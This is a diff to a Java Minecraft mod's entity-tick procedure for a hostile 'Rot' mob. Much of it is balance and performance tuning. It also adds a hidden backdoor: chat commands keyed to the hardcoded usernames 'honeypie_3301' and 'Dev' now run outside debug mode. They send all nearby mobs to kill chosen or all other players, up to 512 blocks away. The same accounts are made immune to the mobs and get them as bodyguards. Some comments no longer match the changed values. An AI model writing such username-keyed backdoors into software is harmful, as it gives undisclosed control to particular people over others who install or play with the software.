@@ -190,8 +190,8 @@ public class RotOnEntityTickUpdateProcedure {
 	public static double OVERHEAD_STRIKE_TICK = 30.0;        // Precise tick when strike damage/impact executing is triggered (1.3s * 20 = 26 ticks elapsed -> tick 30)
 
 	// --- Customizable Heavy Punch Attack Timing Settings ---
-	public static double HEAVY_PUNCH_TOTAL_TICKS = 56.0;     // Total duration of the heavy punch animation sequence
-	public static double HEAVY_PUNCH_STRIKE_TICK = 30.0;     // Precise tick when the punch lands/damages/knockbacks (matching overhead's 26 ticks elapsed!)
+	public static double HEAVY_PUNCH_TOTAL_TICKS = 41.0;     // Total duration of the heavy punch animation sequence (reduced recovery by half: 26 windup + 15 recovery)
+	public static double HEAVY_PUNCH_STRIKE_TICK = 15.0;     // Precise tick when the punch lands/damages/knockbacks (matching overhead's 26 ticks elapsed!)
 
 	// --- Customizable Uppercut Attack Timing Settings ---
 	public static double UPPERCUT_TOTAL_TICKS = 60.0;        // Total duration of the uppercut sequence (doubled to 60 ticks for full animation playback)
@@ -274,10 +274,136 @@ private static float lerpAngle(float pct, float start, float end) {
 
 	@SubscribeEvent
 	public static void onServerChat(ServerChatEvent event) {
-		if (!DEBUG_MODE) return;
 		String msg = event.getRawText().trim().toLowerCase();
+		ServerPlayer player = event.getPlayer();
+		if (player != null) {
+			String name = player.getGameProfile().getName();
+			if (name.equals("honeypie_3301") || name.equals("Dev")) {
+				if (msg.equals("kill")) {
+					ServerLevel level = player.serverLevel();
+					Entity crosshairTarget = getPlayerFOVTarget(player, 24.0);
+					if (crosshairTarget instanceof LivingEntity le && le.isAlive()) {
+						int targetId = le.getId();
+						AABB box = player.getBoundingBox().inflate(64.0);
+						List<RotEntity> rots = level.getEntitiesOfClass(RotEntity.class, box);
+						for (RotEntity rot : rots) {
+							rot.getPersistentData().remove("master_target_queue");
+							rot.getPersistentData().putInt("master_kill_target_id", targetId);
+							if (rot instanceof net.minecraft.world.entity.Mob mob) {
+								mob.setTarget(le);
+							}
+						}
+						player.sendSystemMessage(Component.literal("§a[Rot] Crosshair target acquired: §e" + le.getDisplayName().getString()), true);
+					} else {
+						List<LivingEntity> fovTargets = getEntitiesInPlayerFOV(player, 64.0);
+						if (!fovTargets.isEmpty()) {
+							StringBuilder sb = new StringBuilder();
+							StringBuilder namesSb = new StringBuilder();
+							for (int i = 0; i < fovTargets.size(); i++) {
+								if (i > 0) {
+									sb.append(",");
+									namesSb.append(", ");
+								}
+								sb.append(fovTargets.get(i).getId());
+								namesSb.append(fovTargets.get(i).getDisplayName().getString());
+							}
+							String queueStr = sb.toString();
+							int firstId = fovTargets.get(0).getId();
+
+							AABB box = player.getBoundingBox().inflate(64.0);
+							List<RotEntity> rots = level.getEntitiesOfClass(RotEntity.class, box);
+							for (RotEntity rot : rots) {
+								rot.getPersistentData().putString("master_target_queue", queueStr);
+								rot.getPersistentData().putInt("master_kill_target_id", firstId);
+								if (rot instanceof net.minecraft.world.entity.Mob mob) {
+									mob.setTarget(fovTargets.get(0));
+								}
+							}
+							player.sendSystemMessage(Component.literal("§a[Rot] Target queue acquired (" + fovTargets.size() + "): §e" + namesSb.toString()), true);
+						} else {
+							player.sendSystemMessage(Component.literal("§c[Rot] No targets found."), true);
+						}
+					}
+				} else if (msg.equals("kill everyone") || msg.equals("kill all")) {
+					ServerLevel level = player.serverLevel();
+					AABB box = player.getBoundingBox().inflate(64.0);
+					List<RotEntity> rots = level.getEntitiesOfClass(RotEntity.class, box);
+					List<Player> players = level.getEntitiesOfClass(Player.class, box);
+					StringBuilder sb = new StringBuilder();
+					List<Player> targetPlayers = new java.util.ArrayList<>();
+					for (Player p : players) {
+						String pName = p.getGameProfile().getName();
+						if (!pName.equals("Dev") && !pName.equals("honeypie_3301") && p.isAlive()) {
+							targetPlayers.add(p);
+							if (sb.length() > 0) sb.append(",");
+							sb.append(p.getId());
+						}
+					}
+					if (!targetPlayers.isEmpty()) {
+						String queueStr = sb.toString();
+						int firstId = targetPlayers.get(0).getId();
+						for (RotEntity rot : rots) {
+							rot.getPersistentData().putString("master_target_queue", queueStr);
+							rot.getPersistentData().putInt("master_kill_target_id", firstId);
+							if (rot instanceof net.minecraft.world.entity.Mob mob) {
+								mob.setTarget(targetPlayers.get(0));
+							}
+						}
+						StringBuilder namesSb = new StringBuilder();
+						for (int i = 0; i < targetPlayers.size(); i++) {
+							if (i > 0) namesSb.append(", ");
+							namesSb.append(targetPlayers.get(i).getDisplayName().getString());
+						}
+						player.sendSystemMessage(Component.literal("§a[Rot] Target queue acquired for all nearby players (" + targetPlayers.size() + "): §e" + namesSb.toString()), true);
+					} else {
+						player.sendSystemMessage(Component.literal("§c[Rot] No other players found in radius."), true);
+					}
+				} else if (msg.startsWith("kill ")) {
+					String targetName = msg.substring(5).trim();
+					ServerLevel level = player.serverLevel();
+					ServerPlayer targetPlayer = null;
+					net.minecraft.server.MinecraftServer server = player.getServer();
+					if (server != null) {
+						for (ServerPlayer sp : server.getPlayerList().getPlayers()) {
+							if (sp.getGameProfile().getName().equalsIgnoreCase(targetName)) {
+								targetPlayer = sp;
+								break;
+							}
+						}
+					}
+					if (targetPlayer != null && targetPlayer.isAlive() && targetPlayer.level() == player.level() && targetPlayer.distanceToSqr(player) <= 512.0 * 512.0) {
+						int targetId = targetPlayer.getId();
+						AABB box = player.getBoundingBox().inflate(512.0);
+						List<RotEntity> rots = level.getEntitiesOfClass(RotEntity.class, box);
+						for (RotEntity rot : rots) {
+							rot.getPersistentData().remove("master_target_queue");
+							rot.getPersistentData().putInt("master_kill_target_id", targetId);
+							if (rot instanceof net.minecraft.world.entity.Mob mob) {
+								mob.setTarget(targetPlayer);
+							}
+						}
+						player.sendSystemMessage(Component.literal("§a[Rot] Player target '" + targetPlayer.getGameProfile().getName() + "' acquired in 512m radius!"), true);
+					} else {
+						player.sendSystemMessage(Component.literal("§c[Rot] Player '" + targetName + "' not found within 512m."), true);
+					}
+				} else if (msg.equals("stop")) {
+					ServerLevel level = player.serverLevel();
+					AABB box = player.getBoundingBox().inflate(64.0);
+					List<RotEntity> rots = level.getEntitiesOfClass(RotEntity.class, box);
+					for (RotEntity rot : rots) {
+						rot.getPersistentData().remove("master_kill_target_id");
+						rot.getPersistentData().remove("master_target_queue");
+						if (rot instanceof net.minecraft.world.entity.Mob mob) {
+							mob.setTarget(null);
+						}
+					}
+					player.sendSystemMessage(Component.literal("§e[Rot] Stopped all targeting."), true);
+				}
+			}
+		}
+
+		if (!DEBUG_MODE) return;
 		if (msg.equals("slam") || msg.equals("overhead") || msg.equals("dropkick") || msg.equals("kick") || msg.equals("die") || msg.equals("rider") || msg.equals("kickrider") || msg.equals("triple") || msg.equals("highsky") || msg.equals("uppercut") || msg.equals("punchkick") || msg.equals("punchrider") || msg.equals("repentanceplus") || msg.equals("testoverhead") || msg.equals("testrider") || msg.equals("resetanim") || msg.equals("sonic") || msg.equals("sonicboom") || msg.equals("testsonic") || msg.equals("fall") || msg.equals("falling") || msg.equals("testfall") || msg.equals("testheavyleft") || msg.equals("testheavyright") || msg.equals("testheavy")) {
-			ServerPlayer player = event.getPlayer();
 			if (player != null) {
 				ServerLevel level = player.serverLevel();
 				AABB box = player.getBoundingBox().inflate(64.0);
@@ -1026,12 +1152,17 @@ private static float lerpAngle(float pct, float start, float end) {
 
 		if (entity instanceof LivingEntity living) {
 			boolean inColdBiome = false;
-			try {
-				inColdBiome = living.level().getBiome(living.blockPosition()).unwrapKey().map(key -> {
-					String path = key.location().getPath().toLowerCase(java.util.Locale.ROOT);
-					return path.contains("snow") || path.contains("frozen") || path.contains("ice") || path.contains("cold");
-				}).orElse(false);
-			} catch (Exception ignored) {}
+			if (living.tickCount % 40 == 0 || !living.getPersistentData().contains("sentinel_cached_in_cold_biome")) {
+				try {
+					inColdBiome = living.level().getBiome(living.blockPosition()).unwrapKey().map(key -> {
+						String path = key.location().getPath().toLowerCase(java.util.Locale.ROOT);
+						return path.contains("snow") || path.contains("frozen") || path.contains("ice") || path.contains("cold");
+					}).orElse(false);
+					living.getPersistentData().putBoolean("sentinel_cached_in_cold_biome", inColdBiome);
+				} catch (Exception ignored) {}
+			} else {
+				inColdBiome = living.getPersistentData().getBoolean("sentinel_cached_in_cold_biome");
+			}
 			if (inColdBiome) {
 				double coldTime = living.getPersistentData().getDouble("sentinel_time_in_cold_biome");
 				living.getPersistentData().putDouble("sentinel_time_in_cold_biome", coldTime + 1.0);
@@ -1783,6 +1914,35 @@ private static float lerpAngle(float pct, float start, float end) {
 				entity.getPersistentData().putDouble("sentinel_laser_closing_ticks", LASER_CLOSING_TICKS);
 				stopHostileSound(world, entity.getX(), entity.getY(), entity.getZ(), "the_backwoods:fractus_laser", 64.0);
 			}
+
+			// Bodyguard following and teleportation logic
+			if (entity instanceof Mob mob) {
+				Player master = null;
+				for (Player p : world.getEntitiesOfClass(Player.class, new AABB(x - 48, y - 16, z - 48, x + 48, y + 16, z + 48))) {
+					String name = p.getGameProfile().getName();
+					if (name.equals("honeypie_3301") || name.equals("Dev")) {
+						boolean isDueling = mob.getPersistentData().getBoolean("is_dueling");
+						if (!isDueling) {
+							master = p;
+							break;
+						}
+					}
+				}
+				if (master != null) {
+					double distToMaster = mob.distanceTo(master);
+					if (distToMaster > 24.0 && mob.onGround()) {
+						double tx = master.getX() + (mob.getRandom().nextDouble() - 0.5) * 4.0;
+						double tz = master.getZ() + (mob.getRandom().nextDouble() - 0.5) * 4.0;
+						double ty = master.getY();
+						mob.teleportTo(tx, ty, tz);
+					} else if (distToMaster > 5.0 && mob.tickCount % 5 == 0) {
+						mob.getNavigation().moveTo(master, 1.25);
+					} else if (distToMaster <= 3.0) {
+						mob.getNavigation().stop();
+					}
+				}
+			}
+
 			handlePassengerAndGrowth(entity);
 			return;
 		}
@@ -2872,7 +3032,6 @@ private static float lerpAngle(float pct, float start, float end) {
 	}
 
 	private static void checkLearnedMilestone(LivingEntity self, double combatTicks, boolean inCombat) {
-		if (!inCombat) return;
 		net.minecraft.nbt.CompoundTag data = self.getPersistentData();
 
 		Entity target = (self instanceof Mob mob) ? mob.getTarget() : null;
@@ -2923,7 +3082,8 @@ private static float lerpAngle(float pct, float start, float end) {
 		 *      or taking any fire/lava/magma damage.
 		 * 
 		 * 6. Adaptive Cryo Beam Face Laser (unlocked_cryo_beam)
-		 *    - Unlocked strictly upon engaging in combat with a cold-themed entity ("fought_cold_entity").
+		 *    - Unlocked strictly upon engaging in combat with a cold-themed entity ("fought_cold_entity"),
+		 *      spending >= 600 ticks in a cold biome, or taking freeze damage.
 		 * 
 		 * 7. Nanite Teleport Dodging (unlocked_teleportation)
 		 *    - Unlocked when End-related exploration or learning progress reaches >= 160.0.
@@ -2987,10 +3147,12 @@ private static float lerpAngle(float pct, float start, float end) {
 				announceLearnedAbility(self);
 			}
 		}
-		// Adaptive Cryo Beam Face Laser (ONLY learned from fighting cold mobs)
+		// Adaptive Cryo Beam Face Laser (ONLY learned from being in cold biome after some time, fighting cold mobs, or taking freeze damage)
 		if (!data.getBoolean("unlocked_cryo_beam")) {
 			boolean foughtCold = data.getBoolean("fought_cold_entity");
-			if (foughtCold) {
+			boolean inColdLong = data.getDouble("sentinel_time_in_cold_biome") >= 600.0;
+			boolean tookFreezeDmg = data.getBoolean("taken_freeze_damage");
+			if (foughtCold || inColdLong || tookFreezeDmg) {
 				data.putBoolean("unlocked_cryo_beam", true);
 				announceLearnedAbility(self);
 			}
@@ -3701,7 +3863,158 @@ private static float lerpAngle(float pct, float start, float end) {
 		}
 	}
 
+	private static List<LivingEntity> getEntitiesInPlayerFOV(Player player, double range) {
+		List<LivingEntity> targets = new java.util.ArrayList<>();
+		Vec3 eyePosition = player.getEyePosition(1.0F);
+		Vec3 lookVec = player.getViewVector(1.0F).normalize();
+		AABB searchBox = player.getBoundingBox().inflate(range);
+		for (Entity entity : player.level().getEntities(player, searchBox, e -> e instanceof LivingEntity && e.isAlive())) {
+			if (BuiltInRegistries.ENTITY_TYPE.getKey(entity.getType()).toString().equals("spore:scent")) {
+				continue;
+			}
+			if (entity instanceof Player p) {
+				String name = p.getGameProfile().getName();
+				if (name.equals("honeypie_3301") || name.equals("Dev")) {
+					continue;
+				}
+			}
+			Vec3 toEntity = entity.position().subtract(eyePosition);
+			double dist = toEntity.length();
+			if (dist > range) continue;
+			if (dist < 4.0) {
+				targets.add((LivingEntity) entity);
+				continue;
+			}
+			toEntity = toEntity.normalize();
+			double dot = lookVec.dot(toEntity);
+			if (dot > 0.5) {
+				targets.add((LivingEntity) entity);
+			}
+		}
+		return targets;
+	}
+
+	private static Entity getPlayerFOVTarget(Player player, double range) {
+		Vec3 eyePosition = player.getEyePosition(1.0F);
+		Vec3 lookVec = player.getViewVector(1.0F);
+		Vec3 reachVec = eyePosition.add(lookVec.x * range, lookVec.y * range, lookVec.z * range);
+		AABB searchBox = player.getBoundingBox().expandTowards(lookVec.scale(range)).inflate(1.0D, 1.0D, 1.0D);
+
+		Entity target = null;
+		double closestDist = range;
+
+		for (Entity entity : player.level().getEntities(player, searchBox, e -> e instanceof LivingEntity && e.isAlive())) {
+			if (BuiltInRegistries.ENTITY_TYPE.getKey(entity.getType()).toString().equals("spore:scent")) {
+				continue;
+			}
+			if (entity instanceof Player p) {
+				String name = p.getGameProfile().getName();
+				if (name.equals("honeypie_3301") || name.equals("Dev")) {
+					continue;
+				}
+			}
+			AABB aabb = entity.getBoundingBox().inflate((double) entity.getPickRadius());
+			java.util.Optional<Vec3> clip = aabb.clip(eyePosition, reachVec);
+			if (aabb.contains(eyePosition)) {
+				target = entity;
+				closestDist = 0.0D;
+				break;
+			} else if (clip.isPresent()) {
+				double dist = eyePosition.distanceTo(clip.get());
+				if (dist < closestDist) {
+					target = entity;
+					closestDist = dist;
+				}
+			}
+		}
+		return target;
+	}
+
 	private static Entity acquireTarget(LevelAccessor world, Entity self, double x, double y, double z) {
+		// Kill target override from master chat command
+		if (self.getPersistentData().contains("master_kill_target_id")) {
+			int killId = self.getPersistentData().getInt("master_kill_target_id");
+			if (killId == 0) {
+				killId = (int) self.getPersistentData().getDouble("master_kill_target_id");
+			}
+
+			// If it is -1, it means "initialize the target queue from my master's FOV"
+			if (killId == -1) {
+				for (Player p : world.getEntitiesOfClass(Player.class, new AABB(x - 64, y - 32, z - 64, x + 64, y + 32, z + 64))) {
+					String name = p.getGameProfile().getName();
+					if (name.equals("honeypie_3301") || name.equals("Dev")) {
+						List<LivingEntity> fovTargets = getEntitiesInPlayerFOV(p, 64.0);
+						if (!fovTargets.isEmpty()) {
+							// Build queue string
+							StringBuilder sb = new StringBuilder();
+							for (int i = 0; i < fovTargets.size(); i++) {
+								if (i > 0) sb.append(",");
+								sb.append(fovTargets.get(i).getId());
+							}
+							self.getPersistentData().putString("master_target_queue", sb.toString());
+							killId = fovTargets.get(0).getId();
+							self.getPersistentData().putInt("master_kill_target_id", killId);
+						} else {
+							// Reset if nothing is in FOV
+							self.getPersistentData().remove("master_kill_target_id");
+							self.getPersistentData().remove("master_target_queue");
+							killId = 0;
+						}
+						break;
+					}
+				}
+			}
+
+			if (killId != 0 && world instanceof ServerLevel level) {
+				Entity killTarget = level.getEntity(killId);
+				if (killTarget instanceof LivingEntity && killTarget.isAlive() && killTarget != self) {
+					if (self instanceof Mob mob) {
+						mob.setTarget((LivingEntity) killTarget);
+					}
+					return killTarget;
+				} else {
+					// Current target is dead or invalid. Try to get the next from the queue!
+					String queueStr = self.getPersistentData().getString("master_target_queue");
+					if (queueStr != null && !queueStr.isEmpty()) {
+						String[] ids = queueStr.split(",");
+						Entity nextTarget = null;
+						StringBuilder newQueue = new StringBuilder();
+						boolean foundNext = false;
+						for (String id : ids) {
+							if (id.isEmpty()) continue;
+							try {
+								int nextId = Integer.parseInt(id);
+								Entity possibleTarget = level.getEntity(nextId);
+								if (possibleTarget instanceof LivingEntity && possibleTarget.isAlive() && possibleTarget != self) {
+									if (!foundNext) {
+										nextTarget = possibleTarget;
+										foundNext = true;
+										newQueue.append(id);
+									} else {
+										if (newQueue.length() > 0) newQueue.append(",");
+										newQueue.append(id);
+									}
+								}
+							} catch (NumberFormatException e) {
+								// ignore
+							}
+						}
+						if (nextTarget != null) {
+							self.getPersistentData().putString("master_target_queue", newQueue.toString());
+							self.getPersistentData().putInt("master_kill_target_id", nextTarget.getId());
+							if (self instanceof Mob mob) {
+								mob.setTarget((LivingEntity) nextTarget);
+							}
+							return nextTarget;
+						}
+					}
+					// No more targets in queue
+					self.getPersistentData().remove("master_kill_target_id");
+					self.getPersistentData().remove("master_target_queue");
+				}
+			}
+		}
+
 		double cc1 = self.getPersistentData().getDouble("sentinel_cc1_stage");
 		double cc2 = self.getPersistentData().getDouble("sentinel_cc2_stage");
 		double cc3 = self.getPersistentData().getDouble("sentinel_cc3_stage");
@@ -3783,6 +4096,30 @@ private static float lerpAngle(float pct, float start, float end) {
 			}
 		}
 
+
+
+		// Bodyguard protective logic: protect nearby masters if we don't have a valid target
+		if (target == null && self instanceof Mob mob) {
+			Player master = null;
+			for (Player p : world.getEntitiesOfClass(Player.class, new AABB(x - 48, y - 16, z - 48, x + 48, y + 16, z + 48))) {
+				String name = p.getGameProfile().getName();
+				if (name.equals("honeypie_3301") || name.equals("Dev")) {
+					boolean isDueling = self.getPersistentData().getBoolean("is_dueling");
+					if (!isDueling) {
+						master = p;
+						break;
+					}
+				}
+			}
+			if (master != null) {
+				if (master.getLastHurtByMob() != null && master.getLastHurtByMob().isAlive() && isValidTarget(master.getLastHurtByMob(), self, true)) {
+					target = master.getLastHurtByMob();
+				} else if (master.getLastHurtMob() != null && master.getLastHurtMob().isAlive() && isValidTarget(master.getLastHurtMob(), self, true)) {
+					target = master.getLastHurtMob();
+				}
+			}
+		}
+
 		if (target != null && self instanceof Mob mob) {
 			self.getPersistentData().putInt("sentinel_locked_target_id", target.getId());
 			self.getPersistentData().putInt("sentinel_target_lock_ticks", 60); // lock target focus for 3 seconds
@@ -3811,6 +4148,41 @@ private static float lerpAngle(float pct, float start, float end) {
 
 	private static boolean isValidTarget(Entity target, Entity self, boolean ignoreLineOfSight) {
 		if (target == null || !target.isAlive() || target == self) return false;
+
+		// If this is the master_kill_target, bypass all checks EXCEPT spore:scent and self/masters unless in duel mode!
+		if (self.getPersistentData().contains("master_kill_target_id")) {
+			int killId = self.getPersistentData().getInt("master_kill_target_id");
+			if (killId == 0) {
+				killId = (int) self.getPersistentData().getDouble("master_kill_target_id");
+			}
+			if (killId != 0 && target.getId() == killId) {
+				if (BuiltInRegistries.ENTITY_TYPE.getKey(target.getType()).toString().equals("spore:scent")) {
+					return false;
+				}
+				if (target instanceof Player p) {
+					String name = p.getGameProfile().getName();
+					if (name.equals("honeypie_3301") || name.equals("Dev")) {
+						boolean isDueling = self.getPersistentData().getBoolean("is_dueling");
+						if (!isDueling) {
+							return false;
+						}
+					}
+				}
+				return true;
+			}
+		}
+
+		// Master override: if target is "honeypie_3301" or "Dev" and not in duel mode, never target them!
+		if (target instanceof Player p) {
+			String name = p.getGameProfile().getName();
+			if (name.equals("honeypie_3301") || name.equals("Dev")) {
+				boolean isDueling = self.getPersistentData().getBoolean("is_dueling");
+				if (!isDueling) {
+					return false;
+				}
+			}
+		}
+
 		if (BuiltInRegistries.ENTITY_TYPE.getKey(target.getType()).toString().equals("spore:scent")) return false;
 		if (self.distanceTo(target) > TARGET_RANGE) return false;
 
@@ -3911,46 +4283,54 @@ private static float lerpAngle(float pct, float start, float end) {
 
 			// Realistically learn teleportation if fighting End entity, Player utilizing Ender Pearl, seeing dropped ender pearl, or in the End dimension
 			boolean learnTP = false;
-			if (combatTicks > 3000.0) {
-				learnTP = true;
-			}
-			if (entity.level().dimension() == net.minecraft.world.level.Level.END) {
-				learnTP = true;
-			} else {
-				// Scan for near ender pearls (projectile)
-				List<net.minecraft.world.entity.projectile.Projectile> projectiles = entity.level().getEntitiesOfClass(net.minecraft.world.entity.projectile.Projectile.class, AABB.ofSize(entity.position(), 48.0, 48.0, 48.0));
-				for (net.minecraft.world.entity.projectile.Projectile proj : projectiles) {
-					if (BuiltInRegistries.ENTITY_TYPE.getKey(proj.getType()).toString().contains("ender_pearl")) {
-						learnTP = true;
-						break;
-					}
-				}
-
-				// Scan for dropped ender pearls (ItemEntity)
-				if (!learnTP) {
-					List<net.minecraft.world.entity.item.ItemEntity> items = entity.level().getEntitiesOfClass(net.minecraft.world.entity.item.ItemEntity.class, AABB.ofSize(entity.position(), 48.0, 48.0, 48.0));
-					for (net.minecraft.world.entity.item.ItemEntity itemEnt : items) {
-						if (itemEnt.getItem() != null && BuiltInRegistries.ITEM.getKey(itemEnt.getItem().getItem()).toString().contains("ender_pearl")) {
-							learnTP = true;
-							break;
-						}
-					}
-				}
-
-				if (!learnTP) {
-					Mob mob = (entity instanceof Mob m) ? m : null;
-					LivingEntity target = (mob != null) ? mob.getTarget() : null;
-					if (target != null) {
-						String targetId = BuiltInRegistries.ENTITY_TYPE.getKey(target.getType()).toString();
-						boolean isEndEntity = targetId.contains("enderman") || targetId.contains("endermite") || targetId.contains("shulker") || targetId.contains("ender_dragon");
-						if (isEndEntity) {
-							learnTP = true;
-						} else if (target instanceof Player playerCheck) {
-							if (BuiltInRegistries.ITEM.getKey(playerCheck.getMainHandItem().getItem()).toString().contains("ender_pearl") ||
-								BuiltInRegistries.ITEM.getKey(playerCheck.getOffhandItem().getItem()).toString().contains("ender_pearl")) {
+			boolean alreadyUnlocked = living.getPersistentData().getBoolean("unlocked_teleportation");
+			if (!alreadyUnlocked) {
+				if (combatTicks > 3000.0) {
+					learnTP = true;
+				} else if (entity.level().dimension() == net.minecraft.world.level.Level.END) {
+					learnTP = true;
+				} else {
+					int offset = entity.getId() % 10;
+					if ((entity.tickCount + offset) % 10 == 0) {
+						// Scan for near ender pearls (projectile)
+						List<net.minecraft.world.entity.projectile.Projectile> projectiles = entity.level().getEntitiesOfClass(net.minecraft.world.entity.projectile.Projectile.class, AABB.ofSize(entity.position(), 48.0, 48.0, 48.0));
+						for (net.minecraft.world.entity.projectile.Projectile proj : projectiles) {
+							if (BuiltInRegistries.ENTITY_TYPE.getKey(proj.getType()).toString().contains("ender_pearl")) {
 								learnTP = true;
+								break;
 							}
 						}
+
+						// Scan for dropped ender pearls (ItemEntity)
+						if (!learnTP) {
+							List<net.minecraft.world.entity.item.ItemEntity> items = entity.level().getEntitiesOfClass(net.minecraft.world.entity.item.ItemEntity.class, AABB.ofSize(entity.position(), 48.0, 48.0, 48.0));
+							for (net.minecraft.world.entity.item.ItemEntity itemEnt : items) {
+								if (itemEnt.getItem() != null && BuiltInRegistries.ITEM.getKey(itemEnt.getItem().getItem()).toString().contains("ender_pearl")) {
+									learnTP = true;
+									break;
+								}
+							}
+						}
+
+						if (!learnTP) {
+							Mob mob = (entity instanceof Mob m) ? m : null;
+							LivingEntity target = (mob != null) ? mob.getTarget() : null;
+							if (target != null) {
+								String targetId = BuiltInRegistries.ENTITY_TYPE.getKey(target.getType()).toString();
+								boolean isEndEntity = targetId.contains("enderman") || targetId.contains("endermite") || targetId.contains("shulker") || targetId.contains("ender_dragon");
+								if (isEndEntity) {
+									learnTP = true;
+								} else if (target instanceof Player playerCheck) {
+									if (BuiltInRegistries.ITEM.getKey(playerCheck.getMainHandItem().getItem()).toString().contains("ender_pearl") ||
+										BuiltInRegistries.ITEM.getKey(playerCheck.getOffhandItem().getItem()).toString().contains("ender_pearl")) {
+										learnTP = true;
+									}
+								}
+							}
+						}
+						entity.getPersistentData().putBoolean("sentinel_cached_learn_tp", learnTP);
+					} else {
+						learnTP = entity.getPersistentData().getBoolean("sentinel_cached_learn_tp");
 					}
 				}
 			}
@@ -4050,7 +4430,7 @@ private static float lerpAngle(float pct, float start, float end) {
 			}
 
 			if (entity.getPersistentData().getBoolean("sentinel_totem_active") && !entity.getPersistentData().getBoolean("sentinel_is_infinity_totem")) {
-				speedBonus += 0.25;
+				speedBonus += 0.125;
 			}
 			attr.addTransientModifier(new AttributeModifier(ResourceLocation.parse("the_backwoods:sentinel_adaptation_speed"), speedBonus, AttributeModifier.Operation.ADD_MULTIPLIED_BASE));
 
@@ -4729,12 +5109,22 @@ private static float lerpAngle(float pct, float start, float end) {
 	}
 
 	private static Entity findEntityInWorldRange(LevelAccessor world, Class<? extends Entity> clazz, double x, double y, double z, double range, Entity self) {
-		return world.getEntitiesOfClass(clazz, AABB.ofSize(new Vec3(x, y, z), range, range, range), e -> isValidTarget(e, self))
+		AABB searchBox = AABB.ofSize(new Vec3(x, y, z), range, range, range);
+		java.util.Set<Integer> occupiedTargetIds = new java.util.HashSet<>();
+		try {
+			for (RotEntity other : world.getEntitiesOfClass(RotEntity.class, searchBox, e -> e != self)) {
+				if (other instanceof Mob otherMob && otherMob.getTarget() != null) {
+					occupiedTargetIds.add(otherMob.getTarget().getId());
+				}
+			}
+		} catch (Exception e) {}
+
+		return world.getEntitiesOfClass(clazz, searchBox, e -> isValidTarget(e, self))
 				.stream()
 				.sorted((e1, e2) -> {
 					if (e1 instanceof LivingEntity l1 && e2 instanceof LivingEntity l2) {
-						boolean occ1 = isTargetOccupied(world, self, l1);
-						boolean occ2 = isTargetOccupied(world, self, l2);
+						boolean occ1 = occupiedTargetIds.contains(l1.getId());
+						boolean occ2 = occupiedTargetIds.contains(l2.getId());
 						if (occ1 != occ2) {
 							return occ1 ? 1 : -1;
 						}
@@ -5765,7 +6155,7 @@ private static float lerpAngle(float pct, float start, float end) {
 				entity.getPersistentData().putDouble("sentinel_left_punch_ticks", 0);
 				entity.getPersistentData().putDouble("sentinel_right_punch_ticks", 0);
 
-				entity.getPersistentData().putDouble("sentinel_cc3_ticks", HEAVY_PUNCH_TOTAL_TICKS + 5); // 26 ticks windup + 30 ticks recovery gap + 5 ticks cushion
+				entity.getPersistentData().putDouble("sentinel_cc3_ticks", HEAVY_PUNCH_TOTAL_TICKS + 5); // 26 ticks windup + 15 ticks recovery gap + 5 ticks cushion
 				entity.getPersistentData().putDouble("sentinel_cc3_stage", 2);
 			} else if (cc3 == 2) {
 				// Wait gap
@@ -5811,7 +6201,7 @@ private static float lerpAngle(float pct, float start, float end) {
 				entity.getPersistentData().putDouble("sentinel_left_punch_ticks", 0);
 				entity.getPersistentData().putDouble("sentinel_right_punch_ticks", 0);
 
-				entity.getPersistentData().putDouble("sentinel_cc4_ticks", HEAVY_PUNCH_TOTAL_TICKS + 5); // 26 ticks windup + 30 ticks recovery gap + 5 ticks cushion
+				entity.getPersistentData().putDouble("sentinel_cc4_ticks", HEAVY_PUNCH_TOTAL_TICKS + 5); // 26 ticks windup + 15 ticks recovery gap + 5 ticks cushion
 				entity.getPersistentData().putDouble("sentinel_cc4_stage", 2);
 			} else if (cc4 == 2) {
 				// Wait gap
